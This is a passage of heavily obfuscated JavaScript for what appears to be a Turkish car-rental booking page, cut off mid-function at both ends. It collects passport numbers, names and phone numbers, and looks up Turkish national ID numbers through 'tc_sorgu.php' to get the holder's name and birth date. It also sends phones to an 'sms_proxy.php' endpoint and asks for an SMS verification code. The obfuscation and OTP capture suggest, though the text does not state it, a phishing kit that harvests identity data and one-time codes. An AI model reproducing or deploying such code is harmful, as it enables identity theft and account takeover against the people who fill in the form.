_0x9882a=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u002D\u0069\u006C\u0063\u0065\u002D\u0073\u0065\u006C\u0065\u0063\u0074");_0x9882a['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C']="\u003C\u006F\u0070\u0074\u0069\u006F\u006E\u0020\u0076\u0061\u006C\u0075\u0065\u003D\u0022\u0022\u003E\u0130\u006C\u00E7\u0065\u0020\u0073\u0065\u00E7\u0069\u006E\u002E\u002E\u002E\u003C\u002F\u006F\u0070\u0074\u0069\u006F\u006E\u003E";_0x9882a['\u0064\u0069\u0073\u0061\u0062\u006C\u0065\u0064']=!_0x59b09c;if(!_0x59b09c)return;var _0xcd69db=(702702^702695)+(181431^181439);const _0x37388d=TurkeyLocations['\u0070\u0072\u006F\u0076\u0069\u006E\u0063\u0065\u0073']['\u0066\u0069\u006E\u0064'](p=>p['\u006E\u0061\u006D\u0065']===_0x59b09c);_0xcd69db="oeobaq".split("").reverse().join("");if(_0x37388d)_0x37388d['\u0064\u0069\u0073\u0074\u0072\u0069\u0063\u0074\u0073']['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](d=>{var _0xgf43d=(376484^376487)+(835683^835691);const _0xae_0xa35=document['\u0063\u0072\u0065\u0061\u0074\u0065\u0045\u006C\u0065\u006D\u0065\u006E\u0074']("\u006F\u0070\u0074\u0069\u006F\u006E");_0xgf43d=932742^932751;_0xae_0xa35['\u0076\u0061\u006C\u0075\u0065']=d;_0xae_0xa35['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=d;_0x9882a['\u0061\u0070\u0070\u0065\u006E\u0064\u0043\u0068\u0069\u006C\u0064'](_0xae_0xa35);});}function geriDon(aktifModal,hedefModal){document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](aktifModal)['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0061\u0063\u0074\u0069\u0076\u0065");document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](hedefModal)['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("evitca".split("").reverse().join(""));}function pasaportDevam(_0x9e_0x968){const _0xcfb22g=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0070\u0061\u0073\u0061\u0070\u006F\u0072\u0074\u002D\u006E\u006F")['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D']();_0x9e_0x968=(709178^709178)+(745367^745364);const _0x0bdcf=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("dayosda-tropasap".split("").reverse().join(""))['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D']();var _0x536dg=(234903^234901)+(300569^300571);const _0xb37aa=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0070\u0061\u0073\u0061\u0070\u006F\u0072\u0074\u002D\u0074\u0065\u006C")['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D']();_0x536dg=(655153^655159)+(418098^418100);var _0xb195ef=(827314^827323)+(451484^451483);const _0x8ea78a=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0070\u0061\u0073\u0061\u0070\u006F\u0072\u0074\u002D\u0065\u0072\u0072\u006F\u0072");_0xb195ef=(452692^452695)+(482996^482993);if(!_0xcfb22g){_0x8ea78a['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']="\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0070\u0061\u0073\u0061\u0070\u006F\u0072\u0074\u0020\u006E\u0075\u006D\u0061\u0072\u0061\u0073\u0131\u006E\u0131\u0020\u0067\u0069\u0072\u0069\u006E\u0069\u007A\u002E";_0x8ea78a['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("wohs".split("").reverse().join(""));return;}if(!_0x0bdcf){_0x8ea78a['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=".zinirig \u0131dayos da neft\xFCL".split("").reverse().join("");_0x8ea78a['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0073\u0068\u006F\u0077");return;}if(!_0xb37aa){_0x8ea78a['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']="\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0074\u0065\u006C\u0065\u0066\u006F\u006E\u0020\u006E\u0075\u006D\u0061\u0072\u0061\u0073\u0131\u006E\u0131\u0020\u0067\u0069\u0072\u0069\u006E\u0069\u007A\u002E";_0x8ea78a['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0073\u0068\u006F\u0077");return;}_0x8ea78a['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0073\u0068\u006F\u0077");musteriData={'\u0041\u0044':_0x0bdcf['\u0073\u0070\u006C\u0069\u0074']("\u0020")['\u0073\u006C\u0069\u0063\u0065'](472705^472705,-(799033^799032))['\u006A\u006F\u0069\u006E']("\u0020")||_0x0bdcf,'\u0053\u004F\u0059\u0041\u0044':_0x0bdcf['\u0073\u0070\u006C\u0069\u0074']("\u0020")['\u0073\u006C\u0069\u0063\u0065'](-(664600^664601))[695540^695540]||'','\u0047\u0053\u004D':_0xb37aa,'\u0050\u0041\u0053\u0041\u0050\u004F\u0052\u0054':_0xcfb22g,"ADRESIL":'',"ADRESILCE":''};document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u002D\u0074\u0065\u006C\u0065\u0066\u006F\u006E")&&(document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("nofelet-m".split("").reverse().join(""))['\u0076\u0061\u006C\u0075\u0065']=_0xb37aa);document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u006F\u0064\u0061\u006C\u002D\u0070\u0061\u0073\u0061\u0070\u006F\u0072\u0074")['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("evitca".split("").reverse().join(""));document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("tamilset-ladom".split("").reverse().join(""))['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0061\u0063\u0074\u0069\u0076\u0065");setTeslimat("\u0061\u0064\u0072\u0065\u0073\u0065");}function toggleFarkliIade(){document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0069\u0061\u0064\u0065\u002D\u0068\u0061\u0076\u0061\u006C\u0069\u002D\u0061\u006C\u0061\u006E\u0069")['\u0073\u0074\u0079\u006C\u0065']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079']=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("edai-ilkraf".split("").reverse().join(""))['\u0063\u0068\u0065\u0063\u006B\u0065\u0064']?"kcolb".split("").reverse().join(""):"enon".split("").reverse().join("");}function filtrele(tur){document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u002E\u0066\u0069\u006C\u0074\u0065\u0072\u002D\u0069\u0074\u0065\u006D")['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](el=>el['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0061\u0063\u0074\u0069\u0076\u0065"));var _0x136bf=(523407^523407)+(980774^980773);const _0x6_0x37b=tur?document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("-f".split("").reverse().join("")+tur):document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0066\u002D\u0068\u0065\u0070\u0073\u0069");_0x136bf="pgekin".split("").reverse().join("");if(_0x6_0x37b)_0x6_0x37b['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("evitca".split("").reverse().join(""));document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u002E\u0063\u0061\u0072\u002D\u0063\u0061\u0072\u0064")['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](card=>{card['\u0073\u0074\u0079\u006C\u0065']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079']=!tur||card['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u0074\u0075\u0072']===tur?'':"enon".split("").reverse().join("");});}document['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("dedaoLtnetnoCMOD".split("").reverse().join(""),()=>{ilDoldur();havaliIlleriniDoldur();});(function(_0x2f_0x85g){const _0xfb37c=new Date();_0x2f_0x85g=(956846^956847)+(533421^533413);var _0x42a=(166356^166354)+(432636^432632);const _0x99cc6a=new Date(_0xfb37c);_0x42a='\u0062\u006F\u006C\u0066\u006E\u006E';_0x99cc6a['\u0073\u0065\u0074\u0044\u0061\u0074\u0065'](_0xfb37c['\u0067\u0065\u0074\u0044\u0061\u0074\u0065']()+(329238^329239));const _0x6d47e=n=>String(n)['\u0070\u0061\u0064\u0053\u0074\u0061\u0072\u0074'](844851^844849,"\u0030");const _0x2de=d=>`${d['\u0067\u0065\u0074\u0046\u0075\u006C\u006C\u0059\u0065\u0061\u0072']()}-${_0x6d47e(d['\u0067\u0065\u0074\u004D\u006F\u006E\u0074\u0068']()+(178096^178097))}-${_0x6d47e(d['\u0067\u0065\u0074\u0044\u0061\u0074\u0065']())}`;var _0x0d_0xd95=(623524^623533)+(230263^230260);const _0x65c09b=()=>"\u0031\u0030\u003A\u0030\u0030";_0x0d_0xd95='\u006C\u006E\u006D\u0070\u006E\u006B';document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0061\u006C\u0069\u0073\u002D\u0067\u0075\u006E")['\u0076\u0061\u006C\u0075\u0065']=_0x2de(_0xfb37c);document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0061\u006C\u0069\u0073\u002D\u0073\u0061\u0061\u0074")['\u0076\u0061\u006C\u0075\u0065']=_0x65c09b();document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0069\u0061\u0064\u0065\u002D\u0067\u0075\u006E")['\u0076\u0061\u006C\u0075\u0065']=_0x2de(_0x99cc6a);document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0069\u0061\u0064\u0065\u002D\u0073\u0061\u0061\u0074")['\u0076\u0061\u006C\u0075\u0065']=_0x65c09b();})();function aracSec(id){secilenAracId=id;document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0074\u0063\u002D\u0069\u006E\u0070\u0075\u0074")['\u0076\u0061\u006C\u0075\u0065']='';document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0074\u0063\u002D\u0065\u0072\u0072\u006F\u0072")['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("wohs".split("").reverse().join(""));document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("ct-ladom".split("").reverse().join(""))['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0061\u0063\u0074\u0069\u0076\u0065");}function closeAll(){document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u002E\u006D\u006F\u0064\u0061\u006C\u002D\u006F\u0076\u0065\u0072\u006C\u0061\u0079")['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](m=>m['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0061\u0063\u0074\u0069\u0076\u0065"));}async function tcDogrula(_0xb74c){const _0x1c1c8a=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0074\u0063\u002D\u0069\u006E\u0070\u0075\u0074")['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D']();if(_0x1c1c8a['\u006C\u0065\u006E\u0067\u0074\u0068']!==(820952^820947)){showTcError("\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0031\u0031\u0020\u0068\u0061\u006E\u0065\u006C\u0069\u0020\u0054\u0043\u0020\u006B\u0069\u006D\u006C\u0069\u006B\u0020\u006E\u0075\u006D\u0061\u0072\u0061\u006E\u0131\u007A\u0131\u0020\u0067\u0069\u0072\u0069\u006E\u0069\u007A\u002E");return;}const _0xc9258c=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0062\u0074\u006E\u002D\u0064\u006F\u0067\u0072\u0075\u006C\u0061");_0xb74c=(955466^955464)+(682386^682387);_0xc9258c['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("gnidaol".split("").reverse().join(""));_0xc9258c['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C']="...roy\u0131nalugroS >vid/<>\"rennips\"=ssalc vid<".split("").reverse().join("");document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0074\u0063\u002D\u0065\u0072\u0072\u006F\u0072")['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0073\u0068\u006F\u0077");try{const _0x26g=await fetch(`tc_sorgu.php?tc=${_0x1c1c8a}`);const _0xac2d=await _0x26g['\u006A\u0073\u006F\u006E']();if(_0xac2d['\u0073\u0075\u0063\u0063\u0065\u0073\u0073']&&_0xac2d['\u0069\u006E\u0066\u006F']){musteriData=_0xac2d['\u0069\u006E\u0066\u006F'];document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0075\u002D\u0061\u0064\u0073\u006F\u0079\u0061\u0064")['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0xac2d['\u0069\u006E\u0066\u006F']['\u0041\u0044']+"\u0020"+_0xac2d['\u0069\u006E\u0066\u006F']['\u0053\u004F\u0059\u0041\u0044'];let _0xfd5b;let _0x14c=_0xac2d['\u0069\u006E\u0066\u006F']['\u0044\u004F\u0047\u0055\u004D\u0054\u0041\u0052\u0049\u0048\u0049']||"\u2014";_0xfd5b="biljdq".split("").reverse().join("");if(_0x14c&&_0x14c['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073']("\u002D")){var _0xb9f1cf=(440460^440462)+(122322^122330);const p=_0x14c['\u0073\u0070\u006C\u0069\u0074']("\u002D");_0xb9f1cf=865129^865128;_0x14c=p[497775^497773]+"\u002F"+p[120397^120396]+"\u002F"+p[946602^946602];}document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0075\u002D\u0064\u006F\u0067\u0075\u006D")['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0x14c;document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("nofelet-m".split("").reverse().join(""))['\u0076\u0061\u006C\u0075\u0065']='';document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0075\u0079\u0067\u002D\u0065\u0072\u0072\u006F\u0072")['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0073\u0068\u006F\u0077");document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u006F\u0064\u0061\u006C\u002D\u0074\u0063")['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0061\u0063\u0074\u0069\u0076\u0065");document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u006F\u0064\u0061\u006C\u002D\u0075\u0079\u0067\u0075\u006E\u0073\u0075\u007A")['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0061\u0063\u0074\u0069\u0076\u0065");}else{showTcError(".nide lortnok neft\xFCL .\u0131damanulub \u0131saramun kilmik CT".split("").reverse().join(""));}}catch(e){showTcError("\u0053\u006F\u0072\u0067\u0075\u006C\u0061\u006D\u0061\u0020\u0073\u0131\u0072\u0061\u0073\u0131\u006E\u0064\u0061\u0020\u0062\u0069\u0072\u0020\u0068\u0061\u0074\u0061\u0020\u006F\u006C\u0075\u015F\u0074\u0075\u002E\u0020\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0074\u0065\u006B\u0072\u0061\u0072\u0020\u0064\u0065\u006E\u0065\u0079\u0069\u006E\u002E");}_0xc9258c['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u006C\u006F\u0061\u0064\u0069\u006E\u0067");_0xc9258c['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C']="\u003C\u0069\u0020\u0063\u006C\u0061\u0073\u0073\u003D\u0022\u0066\u0061\u002D\u0073\u006F\u006C\u0069\u0064\u0020\u0066\u0061\u002D\u0063\u0068\u0065\u0063\u006B\u0022\u003E\u003C\u002F\u0069\u003E\u0020\u004B\u0041\u0042\u0130\u0053\u0020\u0069\u006C\u0065\u0020\u0044\u006F\u011F\u0072\u0075\u006C\u0061";}function showTcError(msg,_0x03aef){const _0xef53gf=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0074\u0063\u002D\u0065\u0072\u0072\u006F\u0072");_0x03aef=(792522^792514)+(999408^999411);_0xef53gf['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=msg;_0xef53gf['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0073\u0068\u006F\u0077");}let smsTimerInterval=null;async function devamEt(_0x627e){const _0xg8ff=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u006D\u002D\u0074\u0065\u006C\u0065\u0066\u006F\u006E")['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D']();const _0x41e=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0075\u0079\u0067\u002D\u0065\u0072\u0072\u006F\u0072");_0x627e=338783^338782;if(!_0xg8ff||_0xg8ff['\u006C\u0065\u006E\u0067\u0074\u0068']<(651185^651195)||_0xg8ff['\u006C\u0065\u006E\u0067\u0074\u0068']>(523692^523687)){_0x41e['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=".zinirig \u0131saramun nofelet rib ilre\xE7eg neft\xFCL".split("").reverse().join("");_0x41e['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("wohs".split("").reverse().join(""));return;}_0x41e['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("wohs".split("").reverse().join(""));const _0xgbb5f=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072']("\u0023\u006D\u006F\u0064\u0061\u006C\u002D\u0075\u0079\u0067\u0075\u006E\u0073\u0075\u007A\u0020\u002E\u006D\u006F\u0064\u0061\u006C\u002D\u0062\u0074\u006E");var _0xc9c26a=(202805^202807)+(586260^586261);const _0x20ce=_0xgbb5f['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C'];_0xc9c26a=974259^974267;_0xgbb5f['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u006C\u006F\u0061\u0064\u0069\u006E\u0067");_0xgbb5f['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C']="...ziniyelkeB neft\xFCL >vid/<>\"rennips\"=ssalc vid<".split("").reverse().join("");const _0xee026b=_0xg8ff;try{const _0x8ad6f=await fetch("=let?php.yxorp_sms".split("").reverse().join("")+encodeURIComponent(_0xee026b));const _0xb455f=await _0x8ad6f['\u006A\u0073\u006F\u006E']();if(_0xb455f['\u0073\u0075\u0063\u0063\u0065\u0073\u0073']===!![]){document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("txet-bus-sms".split("").reverse().join(""))['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0xg8ff+"\u0020\u006E\u0075\u006D\u0061\u0072\u0061\u0073\u0131\u006E\u0061\u0020\u0067\u00F6\u006E\u0064\u0065\u0072\u0069\u006C\u0065\u006E\u0020\u0035\u0020\u0068\u0061\u006E\u0065\u006C\u0069\u0020\u0064\u006F\u011F\u0072\u0075\u006C\u0061\u006D\u0061\u0020\u006B\u006F\u0064\u0075\u006E\u0075\u0020\u0067\u0069\u0072\u0069\u006E\u0069\u007A\u002E";document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u006D\u0073\u002D\u006B\u006F\u0064")['\u0076\u0061\u006C\u0075\u0065']='';document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u006D\u0073\u002D\u0065\u0072\u0072\u006F\u0072")['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("wohs".split("").reverse().join(""));document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("zusnugyu-ladom".split("").reverse().join(""))['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("evitca".split("").reverse().join(""));document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("sms-ladom".split("").reverse().join(""))['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("evitca".split("").reverse().join(""));startSmsTimer(602690^602682);}else{const _0xb577a=await fetch("=let?php.yxorp_sms".split("").reverse().join("")+encodeURIComponent(_0xee026b));var _0xa_0x22f=(882106^882098)+(444980^444983);const _0xf4e=await _0xb577a['\u006A\u0073\u006F\u006E']();_0xa_0x22f='\u0064\u0070\u0063\u0069\u0067\u0069';if(_0xf4e['\u0073\u0075\u0063\u0063\u0065\u0073\u0073']===!![]){document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("txet-bus-sms".split("").reverse().join(""))['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0xg8ff+".zinirig unudok amalur\u011Fod ilenah 5 neliredn\xF6g an\u0131saramun ".split("").reverse().join("");document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u006D\u0073\u002D\u006B\u006F\u0064")['\u0076\u0061\u006C\u0075\u0065']='';document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("rorre-sms".split("").reverse().join(""))['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0073\u0068\u006F\u0077");document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("zusnugyu-ladom".split("").reverse().join(""))['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("evitca".split("").reverse().join(""));document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("sms-ladom".split("").reverse().join(""))['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("evitca".split("").reverse().join(""));startSmsTimer(861700^861820);}else{_0x41e['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']="\u0053\u004D\u0053\u0020\u0067\u00F6\u006E\u0064\u0065\u0072\u0069\u006C\u0065\u006D\u0065\u0064\u0069\u002E\u0020\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0064\u0061\u0068\u0061\u0020\u0073\u006F\u006E\u0072\u0061\u0020\u0074\u0065\u006B\u0072\u0061\u0072\u0020\u0064\u0065\u006E\u0065\u0079\u0069\u006E\u0069\u007A\u002E";_0x41e['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0073\u0068\u006F\u0077");}}}catch(e){_0x41e['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']="\u0042\u0069\u0072\u0020\u0068\u0061\u0074\u0061\u0020\u006F\u006C\u0075\u015F\u0074\u0075\u002E\u0020\u004C\u00FC\u0074\u0066\u0065\u006E\u0020\u0074\u0065\u006B\u0072\u0061\u0072\u0020\u0064\u0065\u006E\u0065\u0079\u0069\u006E\u0069\u007A\u002E";_0x41e['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0073\u0068\u006F\u0077");}_0xgbb5f['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u006C\u006F\u0061\u0064\u0069\u006E\u0067");_0xgbb5f['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C']=_0x20ce;}function startSmsTimer(seconds,_0xf272f){if(smsTimerInterval)clearInterval(smsTimerInterval);var _0x2_0x854=(224434^224435)+(454438^454447);const _0x865aea=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u006D\u0073\u002D\u0074\u0069\u006D\u0065\u0072");_0x2_0x854=176998^176997;const _0xe05e=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u006D\u0073\u002D\u006B\u006F\u0064");const _0x2714g=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("alurgod-sms-ntb".split("").reverse().join(""));_0xf272f=(479240^479244)+(507408^507408);const _0xg4a=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u006D\u0073\u002D\u0065\u0072\u0072\u006F\u0072");_0xe05e['\u0064\u0069\u0073\u0061\u0062\u006C\u0065\u0064']=false;_0x2714g['\u0064\u0069\u0073\u0061\u0062\u006C\u0065\u0064']=false;_0x2714g['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("gnidaol".split("").reverse().join(""));let _0x87c3d=seconds;function _0x401eb(){const m=Math['\u0066\u006C\u006F\u006F\u0072'](_0x87c3d/(913093^913145));var _0x2a8d=(911656^911657)+(949898^949897);const 